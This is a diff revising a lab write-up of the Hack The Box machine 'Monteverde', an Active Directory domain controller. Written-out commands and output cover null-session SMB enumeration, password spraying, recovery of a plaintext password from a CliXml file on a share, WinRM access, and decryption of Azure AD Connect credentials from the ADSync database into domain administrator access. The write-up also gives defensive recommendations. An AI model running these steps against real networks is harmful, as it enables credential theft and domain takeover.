@@ -11,27 +11,55 @@ tags:
   - active-directory
   - azure-ad-sync
   - credential-theft
+objective: "Reach domain administrator access from an unauthenticated position on an Active Directory domain controller."
+tools:
+  - rustscan
+  - netexec
+  - evil-winrm
+  - rusthound-ce
+  - winpeas
+  - sqlcmd
+  - powershell
+skill: "Active Directory enumeration and Azure AD Connect credential recovery"
+outcome: "Domain administrator credentials decrypted from the local ADSync database, validated through a privileged WinRM session"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Server 2019 Active Directory domain controller |
+| Starting position | Unauthenticated network access |
+| Objective | Reach domain administrator access from an unauthenticated position |
+| Outcome | Domain administrator WinRM access via credentials decrypted from the ADSync database |
 
 ## Summary
 
-Monteverde is a Medium Windows Active Directory domain controller machine where guest SMB null authentication enables user enumeration and password spray. A weak credential on a service account leads to SMB share enumeration revealing a PowerShell CliXml file containing stored credentials for a domain user. WinRM access as that user exposes Microsoft Azure AD Sync installed on the domain controller; querying the local ADSync database and decrypting stored credentials using the Azure AD Connect cryptography library recovers a domain administrator password, yielding full domain administrative access.
+Monteverde is a Medium-rated Hack The Box Windows machine whose domain controller accepts guest SMB sessions. Null-session SMB enumeration lists the domain accounts, and spraying each username as its own password recovers a service-account credential. That account can read the `users$` share, where a PowerShell CliXml file stores a domain user's password; the credential is validated over SMB and then opens a WinRM foothold. From that shell, Microsoft Azure AD Sync is found installed on the controller, and the local ADSync SQL database together with the Azure AD Connect cryptography library yields the stored connector-account password — the built-in domain `Administrator` in this deployment — confirmed by a privileged WinRM session.
 
-All target IPs, hostnames, and credentials in this writeup are placeholders unless otherwise noted. Commands reference the HTB lab environment only.
+Target addresses, hostnames, and credential values are replaced with role-based placeholders, and command syntax is preserved. Where a step is described narratively without a captured console excerpt, it is summarized rather than quoted.
+
+**Attack path:** **Guest SMB null session → domain user enumeration → password spray → `users$` share → CliXml credential for a domain user → WinRM foothold → ADSync database query → Azure AD Connect credential decryption → domain administrator WinRM access**
 
 ## Context and Objective
 
-The engagement targets an Active Directory domain controller (`<TARGET_HOSTNAME>.<TARGET_DOMAIN>`) hosting DNS, Kerberos, LDAP, SMB, and WinRM services. The domain `<TARGET_DOMAIN>` contains standard user accounts and several service accounts. The objective is to achieve domain administrator access starting from an unauthenticated position.
+- **Target:** an Active Directory domain controller, `<TARGET_HOSTNAME>.<TARGET_DOMAIN>`, hosting DNS, Kerberos, LDAP, SMB, and WinRM.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from unauthenticated access to domain administrator control, and demonstrate how common Active Directory misconfigurations compose into a full compromise.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Port Scanning
+### 1. Port Scanning
 
-A fast TCP scan identifies the target as an AD domain controller with DNS, Kerberos, LDAP, SMB, and WinRM services exposed:
+Observation: a fast TCP scan of the target exposes the service set of an Active Directory domain controller.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
 ```
+
+Truncated scan output:
 
 ```text
 PORT      STATE SERVICE       VERSION
@@ -46,23 +74,29 @@ PORT      STATE SERVICE       VERSION
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
 ```
 
-The domain is `<TARGET_DOMAIN>` and the hostname is `<TARGET_HOSTNAME>`.
+Significance: the combination of DNS, Kerberos, LDAP, SMB, and WinRM identifies a Windows domain controller, so directory authentication and remote management are the primary attack surface.
 
-### Guest SMB Null Authentication
+Result: the target is confirmed as an Active Directory domain controller for `<TARGET_DOMAIN>`.
 
-The domain controller accepts null SMB authentication, confirming guest access is permitted:
+### 2. Guest SMB Null Authentication
+
+Observation: the SMB service accepts a null session, confirming guest access is permitted on the domain controller.
 
 ```bash
 nxc smb <TARGET_IP> -u 'a' -p '' --shares
 ```
 
 ```text
-SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [*] Windows 10 / Server 2019 Build 17763 (Null Auth:True)
+SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [*] Windows 10 / Server 2019 Build 17763 x64 (name:<TARGET_HOSTNAME>) (domain:<TARGET_DOMAIN>) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
-### SMB User Enumeration via Null Session
+Significance: a null SMB session allows directory queries without any credentials, exposing account and share information.
 
-Null authentication SMB enumeration reveals the full domain user list:
+Result: null SMB authentication is accepted, confirming guest-level directory access.
+
+### 3. SMB User Enumeration via Null Session
+
+Observation: the null session can query the directory and enumerate domain accounts.
 
 ```bash
 nxc smb <TARGET_DOMAIN> -u '' -p '' --users
@@ -70,7 +104,7 @@ nxc smb <TARGET_DOMAIN> -u '' -p '' --users
 
 ```text
 <GUEST_ACCOUNT>
-<SYNC_SERVICE_PRINCIPAL>
+<SYNC_SERVICE_ACCOUNT>
 <STANDARD_USER>
 <SERVICE_ACCOUNT>
 <SERVICE_ACCOUNT_2>
@@ -81,11 +115,13 @@ nxc smb <TARGET_DOMAIN> -u '' -p '' --users
 <STANDARD_USER_4>
 ```
 
-The domain contains standard user accounts and several service accounts, plus an Azure AD Connect service principal.
+Significance: the list separates standard users from service accounts and includes the Azure AD Sync service account, giving a target set for credential spraying.
 
-### Password Spray
+Result: the full domain user list is enumerated anonymously.
 
-Usernames are tested as their own passwords:
+### 4. Password Spray
+
+Observation: service accounts are a common home for weak, predictable passwords.
 
 ```bash
 nxc smb <TARGET_DOMAIN> -u user.txt -p user.txt
@@ -95,11 +131,13 @@ nxc smb <TARGET_DOMAIN> -u user.txt -p user.txt
 SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_ACCOUNT_PASSWORD>
 ```
 
-The service account uses its username as its password, demonstrating a weak credential policy.
+Significance: the service account uses its username as its password, so the spray recovers a working credential from a single predictable guess per account.
 
-### SMB Share Enumeration
+Result: valid credentials for `<SERVICE_ACCOUNT>` are recovered.
 
-Shares are enumerated with the compromised credentials:
+### 5. SMB Share Enumeration
+
+Observation: the recovered credential grants authenticated access to the available SMB shares.
 
 ```bash
 nxc smb <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>' --shares
@@ -107,7 +145,7 @@ nxc smb <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>' -
 
 ```text
 ADMIN$       Remote Admin
-azure_uploads   READ
+<AZURE_SHARE>   READ
 C$             Default share
 E$             Default share
 IPC$           READ
@@ -116,11 +154,37 @@ SYSVOL         READ
 users$         READ
 ```
 
-The `azure_uploads` and `users$` shares are readable. The `users$` share contains a single file — an Azure XML credential file under a user directory.
+The `spider_plus` module then lists the readable share contents:
 
-### CliXml Credential Discovery
+```bash
+nxc smb <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
+```
 
-The file `<STANDARD_USER>/azure.xml` is a PowerShell CliXml serialized object containing a stored credential:
+```json
+{
+    "<AZURE_SHARE>": {},
+    "users$": {
+        "<STANDARD_USER>/azure.xml": {
+            "atime_epoch": "2020-01-03 14:41:18",
+            "ctime_epoch": "2020-01-03 14:39:53",
+            "mtime_epoch": "2020-01-03 15:59:24",
+            "size": "1.18 KB"
+        }
+    }
+}
+```
+
+Significance: the `<AZURE_SHARE>` share is empty, but `users$` exposes a single Azure XML credential file under a user directory.
+
+Result: the `users$` share yields `<STANDARD_USER>/azure.xml` for offline analysis.
+
+### 6. CliXml Credential Discovery
+
+Observation: `azure.xml` is a PowerShell CliXml serialized object, not standard XML, and carries a stored plaintext credential.
+
+```bash
+cat azure.xml
+```
 
 ```powershell
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -134,17 +198,29 @@ The file `<STANDARD_USER>/azure.xml` is a PowerShell CliXml serialized object co
       <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
       <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
       <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
-      <S N="Password"><MHOP_PASSWORD></S>
+      <S N="Password"><STANDARD_USER_PASSWORD></S>
     </Props>
   </Obj>
 </Objs>
 ```
 
-The `<S N="Password">` element contains the plaintext password. This is a PowerShell CliXml export of an Azure AD credential object. Testing the credential against discovered users confirms it belongs to `<STANDARD_USER>`.
+The recovered password is tested against the enumerated accounts and authenticates as `<STANDARD_USER>`:
 
-### WinRM Access as a Domain User
+```bash
+nxc smb <TARGET_DOMAIN> -u user.txt -p '<STANDARD_USER_PASSWORD>'
+```
 
-The credentials grant WinRM access:
+```text
+SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
+```
+
+Significance: the CliXml export stored a reusable account password in a share readable by a service account, and the validation confirms which account it belongs to.
+
+Result: a credential pair for `<STANDARD_USER>` is recovered from the share and validated through SMB.
+
+### 7. WinRM Access as a Domain User
+
+Observation: the recovered account is permitted remote management over WinRM.
 
 ```bash
 nxc winrm <TARGET_DOMAIN> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
@@ -154,29 +230,43 @@ nxc winrm <TARGET_DOMAIN> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
 WINRM  <TARGET_IP>  5985  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD> (Pwn3d!)
 ```
 
-An interactive WinRM session is established as `<TARGET_DOMAIN>\<STANDARD_USER>`, the first foothold on the domain controller.
+An interactive session is then opened with the same credential:
 
-### BloodHound and WinPEAS Enumeration
+```bash
+evil-winrm -i <TARGET_IP> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
+```
 
-BloodHound collection maps the AD attack surface:
+Significance: WinRM administrative access over the network turns a recovered domain-user credential into command execution on the domain controller.
+
+Result: an authenticated interactive shell is obtained as `<TARGET_DOMAIN>\<STANDARD_USER>`, the first foothold on the controller.
+
+### 8. Post-Exploitation Enumeration — Azure AD Sync Discovery
+
+Observation: with a domain-user shell, the directory is mapped and the host is searched for local privilege-escalation paths.
 
 ```bash
 rusthound-ce --domain <TARGET_DOMAIN> -u <STANDARD_USER> -p '<STANDARD_USER_PASSWORD>' --zip -o <TARGET_DOMAIN>
 ```
 
-WinPEAS enumerates local privilege escalation vectors. The output reveals Microsoft Azure AD Sync is installed on the domain controller at `c:\program files\microsoft azure ad sync`.
+WinPEAS local enumeration then shows Microsoft Azure AD Sync is installed on the domain controller:
 
-Azure AD Sync stores the on-premises domain administrator credentials with reversible encryption in a local SQL Server database, making this a high-value privilege escalation target.
+```text
+c:\program files\microsoft azure ad sync
+```
 
-### Azure AD Connect Credential Decryption
+Significance: Azure AD Sync stores the on-premises connector credentials with reversible encryption in a local SQL Server database, making the ADSync database a high-value escalation target for a local administrator able to read the ADSync database and load `mcrypt.dll`. In this deployment the stored connector account was the built-in domain `Administrator`; the AD DS Connector account normally holds delegated directory permissions, and current Entra Connect guidance prohibits using a Domain Administrator as the connector account.
 
-The ADSync database is queried to extract encryption metadata:
+Result: Azure AD Sync is identified on the controller, and its ADSync database becomes the focus of the privilege-escalation stage.
+
+### 9. Azure AD Connect Credential Decryption
+
+Observation: the ADSync database holds the encryption metadata needed to decrypt the stored connector credential.
 
 ```bash
 sqlcmd -S <TARGET_HOSTNAME> -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
 ```
 
-The `ADC.ps1` PowerShell function reads the encrypted configuration from the `mms_management_agent` table and uses the Azure AD Connect cryptography library (`mcrypt.dll`) to decrypt it:
+The `Get-ADConnectPassword` function reads the encrypted configuration from the `mms_management_agent` table and decrypts it with the Azure AD Connect cryptography library (`mcrypt.dll`):
 
 ```powershell
 Function Get-ADConnectPassword{
@@ -210,52 +300,65 @@ Function Get-ADConnectPassword{
 }
 ```
 
-Executing the function reveals the domain administrator credentials:
+Executing the function reveals the connector-account credentials:
 
 ```text
 Domain: <TARGET_DOMAIN>
 Username: <DOMAIN_ADMIN_ACCOUNT>
-Password: <ADMIN_PASSWORD>
+Password: <DOMAIN_ADMIN_PASSWORD>
 ```
 
-The decrypted output provides `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` with full domain administrative access.
+Significance: in this deployment the connector account extracted from the ADSync configuration was the built-in domain `Administrator`; the AD DS Connector account normally holds delegated directory permissions, and current Entra Connect guidance prohibits using a Domain Administrator as the connector account. Its password is recoverable from local state by a local administrator able to read the ADSync database and load `mcrypt.dll`.
 
-### Administrator Access via WinRM
+Result: a domain administrator credential pair is decrypted from the ADSync configuration.
 
-The recovered administrator credentials establish a privileged WinRM session:
+### 10. Administrator Access via WinRM
+
+Observation: the recovered domain administrator credential fits the exposed WinRM service.
 
 ```bash
 evil-winrm -i <TARGET_IP> -u <DOMAIN_ADMIN_ACCOUNT> -p '<DOMAIN_ADMIN_PASSWORD>'
 ```
 
-Full administrative access is obtained as `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` on the domain controller.
+```text
+<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>
+```
+
+Significance: authenticated WinRM execution as the connector account completes the privilege transition from domain user to domain administrator.
+
+Result: a privileged session is established as `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` on the domain controller.
 
 ## Challenges and Decisions
 
-No significant failed attempts or troubleshooting was documented in the source. The attack chain progressed linearly through each stage.
+No failed attempts, trade-offs, or troubleshooting steps are recorded for this path; each stage transitioned directly into the next.
 
 ## Outcome
 
-Starting from an unauthenticated position, the full attack chain demonstrates:
-
-1. **Null SMB authentication** → anonymous user enumeration
-2. **Password spray** → service account compromise
-3. **SMB share enumeration** → PowerShell CliXml credential file for a domain user
-4. **WinRM foothold** → interactive shell on the domain controller
-5. **Azure AD Sync enumeration** → local SQL database with reversible domain admin credentials
-6. **ADSync credential decryption** → domain administrator access
-
-The chain exploits four distinct misconfigurations: null SMB access, weak password policy, credential persistence in SMB shares, and Azure AD Connect reversible encryption.
+The evidence establishes domain administrator access on the domain controller: a privileged WinRM session authenticates as `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` after credentials are decrypted from the local ADSync database. The escalation depends on the Azure AD Sync installation and its locally stored encryption keys on that host; no other systems were in scope, and activity remained within the Hack The Box lab.
 
 ## Lessons and Recommendations
 
-- **Disable null SMB sessions** on domain controllers to prevent anonymous information disclosure.
-- **Enforce password complexity** requirements; prohibit username-derived passwords on service accounts.
-- **Never store serialized credentials** on network shares; use managed service accounts or Azure Key Vault.
-- **Restrict Azure AD Sync database access** and use group Managed Service Accounts (gMSA) for the sync service to avoid reversible credential storage.
-- **Rotate stored credentials** in Azure AD Connect regularly to limit exposure window.
+The actions below are recommendations; none was tested in the lab.
+
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action.
+
+1. **Null SMB sessions on the domain controller.** Anonymous SMB sessions allowed unauthenticated account and share enumeration. *Recommendation:* disable null/guest SMB access on domain controllers and restrict anonymous access to named pipes and shares. *Detection:* alert on null-session SMB authentication and anonymous share or directory queries. *Validation:* periodically re-test anonymous SMB enumeration against domain controllers.
+2. **Username-derived service-account password.** A service account used its username as its password, so a single spray pass compromised it. *Recommendation:* enforce password complexity and block username-derived passwords for service accounts. *Detection:* monitor for one-password/many-account spray patterns and for accounts matching the username-as-password shape. *Validation:* audit service-account password policy and confirm spraying fails against the enumerated list.
+3. **Serialized credentials on a network share.** An Azure PowerShell credential object was exported in CliXml and stored on the `users$` share, readable by a service account. *Recommendation:* never store serialized credential objects on shares; use managed service accounts or a dedicated secret store, and keep secrets out of reachable file shares. *Detection:* scan shares and backups for CliXml and other credential artifacts. *Validation:* confirm no credential files remain in readable shares after remediation.
+4. **Reversible Azure AD Connect credential storage.** The ADSync database stored the on-premises connector-account password under reversible encryption, decryptable with the local `mcrypt.dll`. *Recommendation:* restrict access to the ADSync database and key material, prefer group Managed Service Accounts for the sync service where supported, and rotate connector credentials regularly. *Detection:* monitor access to the ADSync database and `mcrypt.dll` by non-administrative users. *Validation:* confirm the connector account is not a standing domain administrator and that its credential can be rotated without service disruption.
 
 ## References
 
-- HTB machine: [Monteverde](https://app.hackthebox.com/machines/Monteverde) (ID 223, retired, Windows, Medium)
-- Azure AD Connect credential extraction: `mcrypt.dll` decryption via local SQL Server `ADSync` database
+- [Hack The Box — Monteverde](https://app.hackthebox.com/machines/Monteverde) (retired Windows machine)
+- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and WinRM enumeration, credential spraying, and share listing)
+- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM interactive shell)
+- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) (BloodHound-compatible Active Directory collector)
+- [BloodHound](https://github.com/SpecterOps/BloodHound) (Active Directory attack-path analysis)
+- [PEASS-ng (WinPEAS)](https://github.com/peass-ng/PEASS-ng) (local privilege-escalation enumeration)
+- [sqlcmd utility — Microsoft Learn](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility) (querying the ADSync SQL database)
+- [Microsoft Entra Connect: Accounts and permissions — Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) (AD DS connector and ADSync service accounts)
+- [Microsoft Entra Connect Sync: Understanding the architecture — Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-azure-ad-connect-sync-architecture) (sync service, connector accounts, and the ADSync database)
+- [Enable insecure guest logons in SMB2 and SMB3 — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3) (guest SMB access)
+- [Network access: Restrict anonymous access to Named Pipes and Shares — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-anonymous-access-to-named-pipes-and-shares) (null-session hardening)
+- [Password must meet complexity requirements — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements) (password policy)
